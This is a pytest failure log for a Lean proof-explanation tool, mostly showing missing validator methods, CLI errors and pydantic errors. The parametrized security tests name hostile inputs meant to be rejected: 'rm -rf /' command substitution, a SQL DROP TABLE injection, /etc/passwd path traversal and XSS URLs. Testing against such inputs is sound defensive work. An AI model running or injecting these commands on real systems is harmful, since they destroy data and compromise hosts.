E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
___ TestInputValidation.test_theorem_name_validation[invalid..double-False] ____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
___ TestInputValidation.test_theorem_name_validation[../../etc/passwd-False] ___
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_____ TestInputValidation.test_theorem_name_validation[$(rm -rf /)-False] ______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
______ TestInputValidation.test_theorem_name_validation[`rm -rf /`-False] ______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_ TestInputValidation.test_theorem_name_validation['; DROP TABLE theorems; ---False] _
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_ TestInputValidation.test_theorem_name_validation[<script>alert('xss')</script>-False] _
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_______________ TestInputValidation.test_lean_code_sanitization ________________
tests/security/test_input_validation.py:165: in test_lean_code_sanitization
    result = InputValidator.sanitize_lean_code(code_with_nulls)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_lean_code'
________________ TestInputValidation.test_filename_sanitization ________________
tests/security/test_input_validation.py:211: in test_filename_sanitization
    result = SecureConfig.sanitize_filename(input_filename)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'sanitize_filename'
_ TestURLValidation.test_url_validation[https://api.anthropic.com/v1/messages-False-True] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
____ TestURLValidation.test_url_validation[https://example.com-False-True] _____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[https://subdomain.example.com-False-True] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[wss://websocket.example.com-False-True] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
____ TestURLValidation.test_url_validation[http://example.com-False-False] _____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_____ TestURLValidation.test_url_validation[ftp://example.com-False-False] _____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
____ TestURLValidation.test_url_validation[file:///etc/passwd-False-False] _____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
__ TestURLValidation.test_url_validation[javascript:alert('xss')-False-False] __
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[data:text/html,<script>alert('xss')</script>-False-False] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
____ TestURLValidation.test_url_validation[http://localhost:8000-True-True] ____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
____ TestURLValidation.test_url_validation[http://127.0.0.1:8000-True-True] ____
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
______ TestURLValidation.test_url_validation[http://localhost-True-True] _______
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
___ TestURLValidation.test_url_validation[http://localhost:8000-False-False] ___
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[https://example.com/../admin-False-False] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[https://example.com/normal/path-False-True] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_____________ TestURLValidation.test_url_validation[-False-False] ______________
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_________ TestURLValidation.test_url_validation[not-a-url-False-False] _________
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
________ TestURLValidation.test_url_validation[://invalid-False-False] _________
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_______ TestURLValidation.test_url_validation[//example.com-False-False] _______
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_ TestURLValidation.test_url_validation[https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False-True] _
tests/security/test_input_validation.py:254: in test_url_validation
    result = SecureConfig.validate_url(url, allow_local=allow_local)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_______________ TestSecureConfiguration.test_api_key_validation ________________
tests/security/test_input_validation.py:265: in test_api_key_validation
    result = SecureConfig.get_api_key()
             ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'get_api_key'
______________ TestSecureConfiguration.test_session_id_generation ______________
tests/security/test_input_validation.py:287: in test_session_id_generation
    session_ids = [SecureConfig.generate_session_id() for _ in range(10)]
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'generate_session_id'
________________ TestSecureConfiguration.test_nonce_generation _________________
tests/security/test_input_validation.py:300: in test_nonce_generation
    nonces = [SecureConfig.generate_nonce() for _ in range(10)]
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'generate_nonce'
________________ TestSecureConfiguration.test_security_headers _________________
tests/security/test_input_validation.py:312: in test_security_headers
    headers = SecureConfig.get_secure_headers()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'get_secure_headers'
_____________ TestSecureConfiguration.test_environment_validation ______________
tests/security/test_input_validation.py:345: in test_environment_validation
    results = SecureConfig.validate_environment()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_environment'
__________________ TestSecurityBypass.test_no_eval_execution ___________________
tests/security/test_input_validation.py:375: in test_no_eval_execution
    result = InputValidator.sanitize_html_output(dangerous_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
________________ TestSecurityBypass.test_no_file_system_access _________________
tests/security/test_input_validation.py:395: in test_no_file_system_access
    assert not InputValidator.validate_file_path(dangerous_path)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_______________ TestSecurityBypass.test_no_network_access_bypass _______________
tests/security/test_input_validation.py:414: in test_no_network_access_bypass
    assert not SecureConfig.validate_url(dangerous_url)
               ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ProofSketcherConfig' has no attribute 'validate_url'
_________________________ TestCLI.test_cli_debug_mode __________________________
tests/test_cli.py:39: in test_cli_debug_mode
    with patch("proof_sketcher.cli.setup_logging") as mock_logging:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'setup_logging'
______________________ TestProveCommand.test_prove_basic _______________________
tests/test_cli.py:70: in test_prove_basic
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
___________________ TestProveCommand.test_prove_with_options ___________________
tests/test_cli.py:105: in test_prove_with_options
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
_________________ TestProveCommand.test_prove_specific_theorem _________________
tests/test_cli.py:129: in test_prove_specific_theorem
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
__________________ TestProveCommand.test_prove_error_handling __________________
tests/test_cli.py:186: in test_prove_error_handling
    assert "Invalid file extension '.txt'" in result.output
E   assert "Invalid file extension '.txt'" in 'Invalid file path: Path escapes current working directory\n'
E    +  where 'Invalid file path: Path escapes current working directory\n' = <Result SystemExit(1)>.output
______________________ TestConfigCommand.test_config_show ______________________
tests/test_cli.py:199: in test_config_show
    from proof_sketcher.animator.models import AnimationQuality
E   ModuleNotFoundError: No module named 'proof_sketcher.animator'
______________________ TestConfigCommand.test_config_save ______________________
tests/test_cli.py:273: in test_config_save
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
----------------------------- Captured stdout call -----------------------------
Output: Usage: cli config [OPTIONS]
Try 'cli config --help' for help.

Error: No such option: --output

Exception: 2
----------------------------- Captured stderr call -----------------------------
Traceback (most recent call last):
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/core.py", line 1363, in main
    rv = self.invoke(ctx)
         ^^^^^^^^^^^^^^^^
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/core.py", line 1828, in invoke
    sub_ctx = cmd.make_context(cmd_name, args, parent=ctx)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/core.py", line 1186, in make_context
    self.parse_args(ctx, args)
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/core.py", line 1194, in parse_args
    opts, args, param_order = parser.parse_args(args=args)
                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/parser.py", line 307, in parse_args
    self._process_args_for_options(state)
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/parser.py", line 334, in _process_args_for_options
    self._process_opts(arg, state)
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/parser.py", line 484, in _process_opts
    self._match_long_opt(norm_long_opt, explicit_value, state)
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/parser.py", line 368, in _match_long_opt
    raise NoSuchOption(opt, possibilities=possibilities, ctx=self.ctx)
click.exceptions.NoSuchOption: No such option: --output

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/testing.py", line 494, in invoke
    return_value = cli.main(args=args or (), prog_name=prog_name, **extra)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/click/core.py", line 1381, in main
    sys.exit(e.exit_code)
SystemExit: 2
______________________ TestCacheCommand.test_cache_status ______________________
tests/test_cli.py:300: in test_cache_status
    with patch("proof_sketcher.cli.CacheManager") as mock_cache_class:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
______________________ TestCacheCommand.test_cache_clear _______________________
tests/test_cli.py:336: in test_cache_clear
    with patch("proof_sketcher.cli.CacheManager") as mock_cache_class:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
_______________ TestCacheCommand.test_cache_clear_specific_type ________________
tests/test_cli.py:368: in test_cache_clear_specific_type
    with patch("proof_sketcher.cli.CacheManager") as mock_cache_class:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'CacheManager'
______________________ TestListCommand.test_list_theorems ______________________
tests/test_cli.py:411: in test_list_theorems
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
__________________ TestBatchProcessing.test_process_directory __________________
tests/test_cli.py:477: in test_process_directory
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
____________________ TestBatchProcessing.test_progress_bar _____________________
tests/test_cli.py:525: in test_progress_bar
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
__________________ TestCLIIntegration.test_full_pipeline_cli ___________________
tests/test_cli.py:573: in test_full_pipeline_cli
    with patch("proof_sketcher.cli.SimpleLeanParser") as mock_parser:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <module 'proof_sketcher.cli' from '/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/cli/__init__.py'> does not have the attribute 'SimpleLeanParser'
__________________ TestCLIIntegration.test_config_persistence __________________
tests/test_cli.py:643: in test_config_persistence
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
______ TestEducationalContentGenerator.test_generate_content_from_docgen _______
tests/unit/test_docgen_plugin.py:203: in test_generate_content_from_docgen
    content = generator.generate_content_from_docgen(
src/proof_sketcher/docgen_plugin/content_generator.py:75: in generate_content_from_docgen
    self.progressive_generator.generate_progressive_explanation(theorem_info)
src/proof_sketcher/generator/progressive_generator.py:136: in generate_progressive_explanation
    sketch = self.semantic_generator.generate_educational_sketch(theorem, level)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/generator/semantic_generator.py:88: in generate_educational_sketch
    return self._generate_basic_sketch(theorem, target_level, config)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/generator/semantic_generator.py:175: in _generate_basic_sketch
    steps = self._generate_basic_steps(theorem, target_level)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/generator/semantic_generator.py:226: in _generate_basic_steps
    ProofStep(
E   pydantic_core._pydantic_core.ValidationError: 4 validation errors for ProofStep
E   intuitive_explanation
E     Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_explanation
E     Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_explanation
E     Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_explanation
E     Field required [type=missing, input_value={'step_number': 1, 'descr...rove and what we know."}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
___________ TestEducationalContentGenerator.test_estimate_difficulty ___________
tests/unit/test_docgen_plugin.py:273: in test_estimate_difficulty
    assert generator._estimate_difficulty(long_statement) == "advanced"
E   AssertionError: assert 'intermediate' == 'advanced'
E
E     - advanced
E     + intermediate
________________ TestLakeFacet.test_generate_educational_assets ________________
tests/unit/test_docgen_plugin.py:473: in test_generate_educational_assets
    assert css_file.exists()
E   AssertionError: assert False
E    +  where False = exists()
E    +    where exists = PosixPath('/var/folders/kb/h2jmx6m91qld2ldqbdprhbhr0000gn/T/tmpilzv4f4y/output/assets/educational.css').exists
___________________ TestHTMLExporter.test_html_export_single ___________________
src/proof_sketcher/exporter/html.py:87: in export_single
    created_files = self._export_sketch(sketch, context)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:147: in _export_sketch
    template_context = self._create_template_context_html(sketch, context)
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:282: in _create_template_context_html
    base_context = super()._create_template_context(sketch, context)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'super' object has no attribute '_create_template_context'

During handling of the above exception, another exception occurred:
tests/unit/test_exporters.py:158: in test_html_export_single
    result = exporter.export_single(sample_proof_sketch)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:96: in export_single
    return ExportResult(
E   TypeError: ExportResult.__init__() got an unexpected keyword argument 'output_files'
------------------------------ Captured log call -------------------------------
ERROR    proof_sketcher.exporter.html:html.py:95 Failed to export test_theorem: 'super' object has no attribute '_create_template_context'
______________ TestHTMLExporter.test_html_export_with_animations _______________
src/proof_sketcher/exporter/html.py:87: in export_single
    created_files = self._export_sketch(sketch, context)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:147: in _export_sketch
    template_context = self._create_template_context_html(sketch, context)
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:282: in _create_template_context_html
    base_context = super()._create_template_context(sketch, context)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'super' object has no attribute '_create_template_context'

During handling of the above exception, another exception occurred:
tests/unit/test_exporters.py:178: in test_html_export_with_animations
    result = exporter.export_single(sample_proof_sketch, animation_path)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/exporter/html.py:96: in export_single
    return ExportResult(
E   TypeError: ExportResult.__init__() got an unexpected keyword argument 'output_files'
------------------------------ Captured log call -------------------------------
ERROR    proof_sketcher.exporter.html:html.py:95 Failed to export test_theorem: 'super' object has no attribute '_create_template_context'
___________________ TestHTMLExporter.test_html_export_batch ____________________
tests/unit/test_exporters.py:186: in test_html_export_batch
    ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
